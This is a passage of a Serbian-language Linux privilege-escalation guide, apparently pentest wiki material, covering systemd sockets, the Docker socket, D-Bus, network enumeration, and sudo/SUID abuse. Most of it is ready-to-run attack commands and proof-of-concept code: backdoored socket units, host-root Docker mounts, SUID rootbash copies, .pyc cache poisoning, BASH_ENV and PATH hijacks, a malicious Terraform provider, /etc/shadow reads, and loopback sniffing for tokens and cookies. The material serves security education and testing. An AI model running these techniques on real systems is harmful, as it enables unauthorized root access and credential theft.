**Saznajte više o timerima pomoću `man systemd.timer`.**

### **Omogućavanje Timera**

Da biste omogućili timer, potrebne su vam root privilegije i potrebno je da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Imajte na umu da se **timer** **aktivira** kreiranjem simboličke veze do njega na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) omogućavaju **komunikaciju između procesa** na istoj ili različitim mašinama u okviru client-server modela. Oni koriste standardne Unix descriptor fajlove za komunikaciju između računara i konfigurišu se putem `.socket` fajlova.

Sockets se mogu konfigurisati korišćenjem `.socket` fajlova.

**Više informacija o sockets pronađite pomoću `man systemd.socket`.** Unutar ovog fajla može se konfigurisati nekoliko zanimljivih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali se koristi sažetak koji **navodi gde će socket slušati** (putanja do AF_UNIX socket fajla, IPv4/6 adresa i/ili broj porta na kojem treba slušati itd.)
- `Accept`: Prima boolean argument. Ako je **true**, **service instanca se pokreće za svaku dolaznu konekciju** i prosleđuje joj se samo konekcioni socket. Ako je **false**, svi socketi koji osluškuju **prosleđuju se pokrenutoj service jedinici**, a samo jedna service jedinica pokreće se za sve konekcije. Ova vrednost se ignoriše za datagram sockets i FIFO fajlove, gde jedna service jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevana vrednost je false**. Iz razloga performansi, preporučuje se da se novi daemons pišu tako da budu kompatibilni sa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Primaju jednu ili više komandnih linija koje se **izvršavaju pre** ili **nakon** što se socketi/FIFO fajlovi za osluškivanje **kreiraju** i binduju. Prvi token komandne linije mora biti apsolutna putanja do fajla, nakon čega slede argumenti procesa.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **nakon** što se socketi/FIFO fajlovi za osluškivanje **zatvore** i uklone.
- `Service`: Navodi naziv **service** jedinice koju treba **aktivirati** pri **dolaznom saobraćaju**. Ova postavka je dozvoljena samo za sockete sa `Accept=no`. Podrazumevano se koristi service koji ima isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva ne bi trebalo da bude potrebno koristiti ovu opciju.

### Writable .socket files

Ako pronađete **writable** `.socket` fajl, možete **dodati** na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor`, pa će se backdoor izvršiti pre nego što se socket kreira. Zbog toga ćete **verovatno morati da sačekate da se mašina restartuje.**\
_Imajte na umu da sistem mora koristiti konfiguraciju tog socket fajla, u suprotnom se backdoor neće izvršiti_

### Socket activation + writable unit path (create missing service)

Još jedna misconfiguration sa velikim uticajem je:

- socket unit sa `Accept=no` i `Service=<name>.service`
- referencirana service jedinica nedostaje
- attacker može da upisuje u `/etc/systemd/system` (ili neku drugu unit search path)

U tom slučaju attacker može da kreira `<name>.service`, a zatim pošalje saobraćaj socketu, tako da systemd učita i izvrši novu service jedinicu kao root.

Brzi tok:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Socket-i sa mogućnošću upisivanja

Ako **identifikujete bilo koji socket sa mogućnošću upisivanja** (_sada govorimo o Unix socket-ima, a ne o config `.socket` fajlovima_), onda **možete komunicirati** sa tim socket-om i možda iskoristiti ranjivost.

### Enumerisanje Unix socket-a
```bash
netstat -a -p --unix
```
### Sirova konekcija
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP socketi

Imajte na umu da možda postoje neki **socketi koji osluškuju HTTP** zahteve (_ne govorim o .socket datotekama, već o datotekama koje funkcionišu kao Unix socketi_). Ovo možete proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Ako socket **odgovara HTTP** zahtevom, možete **komunicirati** s njim i možda **iskoristiti neku ranjivost**.

### Writable Docker Socket

Docker socket, koji se često nalazi na putanji `/var/run/docker.sock`, predstavlja kritičnu datoteku koju treba zaštititi. Podrazumevano, u njega mogu da upisuju korisnik `root` i članovi grupe `docker`. Posedovanje prava upisa u ovaj socket može dovesti do eskalacije privilegija. U nastavku je objašnjeno kako se to može uraditi, kao i alternativne metode ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate pravo upisa u Docker socket, privilegije možete eskalirati pomoću sledećih komandi:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande omogućavaju pokretanje containera sa root-level pristupom sistemu datoteka hosta.

#### **Direktno korišćenje Docker API-ja**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može koristiti pomoću Docker API-ja i `curl` komandi.

1.  **Izlistavanje Docker Images:** Preuzmite listu dostupnih images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Kreiranje containera:** Pošaljite zahtev za kreiranje containera koji montira root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Pokrenite novokreirani container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Povezivanje sa containerom:** Koristite `socat` da uspostavite vezu sa containerom, čime se omogućava izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` veze, možete direktno izvršavati komande u containeru sa root-level pristupom sistemu datoteka hosta.

### Ostalo

Imajte na umu da, ako imate dozvole za upis u docker socket zato što se nalazite **u grupi `docker`**, imate [**više načina za eskalaciju privilegija**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API osluškuje port**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), takođe ga možete kompromitovati.

Pogledajte **više načina za izlazak iz containera ili zloupotrebu container runtime-a radi eskalacije privilegija** na:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Eskalacija privilegija pomoću Containerd-a (ctr)

Ako utvrdite da možete koristiti komandu **`ctr`**, pročitajte sledeću stranicu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Eskalacija privilegija pomoću **RunC-a**

Ako utvrdite da možete koristiti komandu **`runc`**, pročitajte sledeću stranicu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran **inter-Process Communication (IPC) system** koji aplikacijama omogućava efikasnu interakciju i razmenu podataka. Dizajniran imajući u vidu moderne Linux sisteme, pruža robusni okvir za različite oblike komunikacije između aplikacija.

Sistem je prilagodljiv i podržava osnovni IPC koji poboljšava razmenu podataka između procesa, slično **enhanced UNIX domain sockets**. Takođe omogućava emitovanje događaja ili signala, podstičući neometanu integraciju između komponenti sistema. Na primer, signal Bluetooth daemon-a o dolaznom pozivu može navesti music player da utiša zvuk, čime se poboljšava korisničko iskustvo. Pored toga, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za servisima i pozive metoda između aplikacija i olakšavajući procese koji su tradicionalno bili složeni.

D-Bus radi po **allow/deny modelu**, upravljajući dozvolama za poruke (pozivi metoda, emitovanje signala itd.) na osnovu kumulativnog efekta pravila policy-ja koja se podudaraju. Ove policy-je određuju interakcije sa bus-om i potencijalno omogućavaju eskalaciju privilegija kroz zloupotrebu tih dozvola.

Primer takvog policy-ja u `/etc/dbus-1/system.d/wpa_supplicant.conf` prikazuje dozvole root korisnika da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Policy-ji bez navedenog korisnika ili grupe primenjuju se univerzalno, dok se policy-ji u kontekstu "default" primenjuju na sve slučajeve koji nisu obuhvaćeni drugim specifičnim policy-jima.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da enumerišete i iskoristite D-Bus komunikaciju ovde:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo enumerisati mrežu i utvrditi poziciju mašine.

### Generička enumeracija
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Brza procena outbound filtering-a

Ako host može da izvršava komande, ali callback-ovi ne uspevaju, brzo razdvojite DNS, transport, proxy i route filtering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini, a sa kojima niste mogli da stupite u interakciju pre nego što ste joj pristupili:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klasifikujte listeners prema bind target-u:

- `0.0.0.0` / `[::]`: izloženi na svim lokalnim interfejsima.
- `127.0.0.1` / `::1`: dostupni samo lokalno (dobri kandidati za tunnel/forward).
- Specifične interne IP adrese (npr. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): obično dostupne samo iz internih segmenata.

### Tok rada za trijažu lokalno dostupnih servisa

Kada kompromitujete host, servisi vezani za `127.0.0.1` često prvi put postaju dostupni iz vašeg shell-a. Brz lokalni tok rada je:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS kao mrežni skener (režim samo za mrežu)

Pored lokalnih provera eskalacije privilegija, linPEAS može da radi kao fokusirani mrežni skener. Koristi dostupne binarne datoteke u `$PATH` (obično `fping`, `ping`, `nc`, `ncat`) i ne instalira dodatne alate.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Ako prosledite `-d`, `-p` ili `-i` bez `-t`, linPEAS se ponaša kao čisti mrežni skener (preskačući ostale provere za privilege escalation).

### Sniffing

Proverite da li možete da sniffujete saobraćaj. Ako možete, možda ćete moći da preuzmete neke credentials.
```
timeout 1 tcpdump
```
Brze praktične provere:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) je naročito vredan tokom post-exploitation procesa jer mnogi servisi dostupni samo interno tamo izlažu tokene/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Snimite sada, raščlanite kasnije:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Korisnici

### Opšta enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji su **korisnici** prisutni na sistemima, koji mogu da se **prijave** i koji imaju **root privilegije:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke Linux verzije bile su pogođene greškom koja korisnicima sa **UID > INT_MAX** omogućava eskalaciju privilegija. Više informacija: [ovde](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ovde](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [ovde](https://twitter.com/paragonsec/status/1071152249529884674).\
**Iskoristite je** pomoću: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi vam mogla dodeliti root privilegije:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Proverite da li se nešto zanimljivo nalazi u Clipboard-u (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** u okruženju, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta stvaranje velike količine buke i ako su binarni fajlovi `su` i `timeout` prisutni na računaru, možete pokušati da izvršite brute-force korisnika pomoću [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` takođe pokušava da izvrši brute-force korisnika.

## Zloupotreba upisivog PATH-a

### $PATH

Ako utvrdite da možete da **upisujete unutar neke fascikle iz $PATH-a**, možda ćete moći da eskalirate privilegije tako što ćete **kreirati backdoor unutar fascikle sa dozvolom za upis**, koristeći naziv neke komande koju će izvršiti drugi korisnik (idealno root), a koja se **ne učitava iz fascikle koja se u $PATH-u nalazi pre** vaše fascikle sa dozvolom za upis.

### SUDO i SUID

Možda vam je dozvoljeno da izvršavate određene komande koristeći `sudo`, ili one mogu imati suid bit. Proverite to pomoću:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande omogućavaju vam da čitate i/ili upisujete datoteke ili čak izvršite komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može omogućiti korisniku da izvrši određenu komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`, pa je sada trivijalno dobiti shell dodavanjem SSH ključa u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi promenljivu okruženja** prilikom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB mašini Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** za učitavanje proizvoljne Python biblioteke tokom izvršavanja skripte kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Trovanje upisivog `__pycache__` / `.pyc` fajla pri importovanju u Pythonu dozvoljenom preko sudo

Ako **Python skripta dozvoljena preko sudo** importuje modul čiji paketni direktorijum sadrži **upisiv `__pycache__`**, možda ćete moći da zamenite keširani `.pyc` i izvršite kod kao privilegovani korisnik pri sledećem importovanju.

- Zašto funkcioniše:
- CPython čuva keš bajtkoda u `__pycache__/module.cpython-<ver>.pyc`.
- Interpreter proverava **zaglavlje** (magic + metapodatke o vremenskoj oznaci/hash-u povezane sa izvornim kodom), a zatim izvršava marshaled code object koji se nalazi iza tog zaglavlja.
- Ako možete da **obrišete i ponovo kreirate** keširani fajl zato što je direktorijum upisiv, `.pyc` u vlasništvu root-a, ali bez dozvole za upis, ipak može biti zamenjen.
- Tipična putanja:
- `sudo -l` prikazuje Python skriptu ili wrapper koji možete da pokrenete kao root.
- Ta skripta importuje lokalni modul iz `/opt/app/`, `/usr/local/lib/...` itd.
- Direktorijum `__pycache__` importovanog modula upisiv je za vašeg korisnika ili za sve korisnike.

Brza enumeracija:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Ako možete da pregledate privilegovanu skriptu, identifikujte uvezene module i njihovu putanju keša:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Tok zloupotrebe:

1. Pokrenite skriptu dozvoljenu putem sudo jednom kako bi Python kreirao legitimni cache fajl ako već ne postoji.
2. Pročitajte prvih 16 bajtova iz legitimnog `.pyc` fajla i ponovo ih upotrebite u zatrovanom fajlu.
3. Kompajlirajte payload code object, primenite `marshal.dumps(...)` na njega, obrišite originalni cache fajl i ponovo ga kreirajte sa originalnim header-om i vašim malicioznim bytecode-om.
4. Ponovo pokrenite skriptu dozvoljenu putem sudo kako bi import izvršio vaš payload sa root privilegijama.

Važne napomene:

- Ponovna upotreba originalnog header-a je ključna zato što Python proverava metadata cache-a u odnosu na source fajl, a ne da li telo bytecode-a zaista odgovara source-u.
- Ovo je naročito korisno kada je source fajl u vlasništvu root-a i nije upisiv, ali je direktorijum koji sadrži `__pycache__` upisiv.
- Napad neće uspeti ako privilegovani proces koristi `PYTHONDONTWRITEBYTECODE=1`, importuje sa lokacije sa bezbednim permissions-ima ili ukloni write access za svaki direktorijum u import path-u.

Minimalni oblik proof-of-concept-a:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Uverite se da nijedan direktorijum u privilegovanom Python import path-u nije upisiv korisnicima sa niskim privilegijama, uključujući `__pycache__`.
- Za privilegovana pokretanja razmotrite `PYTHONDONTWRITEBYTECODE=1` i periodične provere neočekivano upisivih `__pycache__` direktorijuma.
- Sa upisivim lokalnim Python modulima i upisivim cache direktorijumima postupajte na isti način kao sa upisivim shell skriptama ili shared libraries koje izvršava root.

### BASH_ENV preserved via sudo env_keep → root shell

Ako sudoers čuva `BASH_ENV` (npr. `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri pokretanju non-interactive shell-a da izvršite proizvoljan kod kao root prilikom pokretanja dozvoljene komande.

- Zašto funkcioniše: Kod non-interactive shell-ova, Bash evaluira `$BASH_ENV` i učitava taj fajl pre pokretanja ciljne skripte. Mnoga sudo pravila dozvoljavaju pokretanje skripte ili shell wrapper-a. Ako sudo čuva `BASH_ENV`, vaš fajl se učitava sa root privilegijama.

- Zahtevi:
- Sudo pravilo koje možete da pokrenete (bilo koji target koji non-interactive poziva `/bin/bash`, ili bilo koja bash skripta).
- `BASH_ENV` prisutan u `env_keep` (proverite pomoću `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Ojačavanje:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`; prednost dajte opciji `env_reset`.
- Izbegavajte shell wrappers za komande dozvoljene kroz sudo; koristite minimalne binaries.
- Razmotrite sudo I/O logging i alerting kada se koriste sačuvane env promenljive.

### Terraform preko sudo sa sačuvanim HOME (!env_reset)

Ako sudo ostavlja environment nepromenjenim (`!env_reset`) dok dozvoljava `terraform apply`, `$HOME` ostaje vrednost korisnika koji poziva komandu. Terraform zato učitava **$HOME/.terraformrc** kao root i poštuje `provider_installation.dev_overrides`.

- Usmerite traženog providera na direktorijum u koji je moguće upisivati i ubacite malicious plugin nazvan po provideru (npr. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform ће доживети неуспех током Go plugin handshake-а, али ће извршити payload као root пре него што се прекине, остављајући SUID shell за собом.

### TF_VAR overrides + symlink validation bypass

Terraform променљиве могу да се проследе путем `TF_VAR_<name>` environment variables, које остају доступне када sudo сачува environment. Слабе валидације, као што је `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, могу се заобићи помоћу symlink-ова:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform razrešava symlink i kopira stvarni `/root/root.txt` na odredište čitljivo napadaču. Isti pristup može da se koristi za **upisivanje** u privilegovane putanje prethodnim kreiranjem symlinkova na odredištu (npr. usmeravanjem odredišne putanje provider-a unutar `/etc/cron.d/`).

### requiretty / !requiretty

Na nekim starijim distribucijama sudo može biti konfigurisan sa `requiretty`, što primorava sudo da se pokreće samo iz interaktivnog TTY-ja. Ako je postavljen `!requiretty` (ili opcija nije prisutna), sudo može da se izvršava iz neinteraktivnih konteksta, kao što su reverse shell-ovi, cron poslovi ili skripte.
```bash
Defaults !requiretty
```
Ovo samo po sebi nije direktna ranjivost, ali proširuje situacije u kojima se sudo pravila mogu zloupotrebiti bez potrebe za punim PTY-jem.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ako `sudo -l` prikazuje `env_keep+=PATH` ili `secure_path` koji sadrži stavke koje napadač može da upisuje (npr. `/home/<user>/bin`), svaka relativna komanda unutar cilja dozvoljenog sudo pravilom može biti zamenjena.

- Zahtevi: sudo pravilo (često `NOPASSWD`) koje pokreće script/binary koji poziva komande bez apsolutnih putanja (`free`, `df`, `ps`, itd.) i writable PATH stavka koja se prva pretražuje.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Zaobilaženje putanja pri izvršavanju preko Sudo-a
**Pređite** da biste čitali druge datoteke ili koristili **symlinks**. Na primer, u sudoers datoteci: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Mere zaštite**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komanda/SUID binary bez putanje do komande

Ako je **sudo dozvola** dodeljena jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_, možete je iskoristiti promenom PATH promenljive
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binary **izvršava drugu komandu bez navođenja putanje do nje (uvek proverite pomoću** _**strings**_ **sadržaj neobičnog SUID binary-ja)**.

[Primeri payload-a za izvršavanje.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binary sa putanjom do komande

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, možete pokušati da **izvezete funkciju** nazvanu kao komanda koju suid fajl poziva.

Na primer, ako suid binary poziva _**/usr/sbin/service apache2 start**_, morate pokušati da kreirate funkciju i izvezete je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binary, ova funkcija će biti izvršena

### Skripta sa dozvolom za pisanje koju izvršava SUID wrapper

Česta pogrešna konfiguracija custom aplikacije jeste SUID binary wrapper u vlasništvu root korisnika koji izvršava skriptu, dok samom skriptom mogu da pišu korisnici sa niskim privilegijama.

Tipičan obrazac:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Ako je `/usr/local/bin/backup.sh` moguće menjati, možete dodati payload komande, a zatim izvršiti SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Brze provere:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ovaj napadni put je naročito čest kod „maintenance“/„backup“ wrappera koji se isporučuju u `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Promenljiva okruženja **LD_PRELOAD** koristi se za navođenje jedne ili više deljenih biblioteka (.so datoteka) koje će učitavač učitati pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces poznat je kao predučitavanje biblioteke.

Međutim, radi održavanja bezbednosti sistema i sprečavanja zloupotrebe ove funkcije, naročito kod **suid/sgid** izvršnih datoteka, sistem primenjuje određene uslove:

- Učitavač zanemaruje **LD_PRELOAD** za izvršne datoteke kod kojih se stvarni ID korisnika (_ruid_) ne podudara sa efektivnim ID-om korisnika (_euid_).
- Kod izvršnih datoteka sa suid/sgid, predučitavaju se samo biblioteke iz standardnih putanja koje takođe imaju suid/sgid.

